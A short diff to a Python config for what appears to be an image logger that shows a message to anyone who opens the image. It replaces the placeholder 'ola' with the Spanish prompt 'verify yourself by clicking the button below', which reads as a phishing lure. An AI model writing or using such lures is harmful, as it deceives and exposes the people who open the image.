@@ -26,7 +26,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "ola", # Message to show
+        "message": "verificate dandole al boton de abajo", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
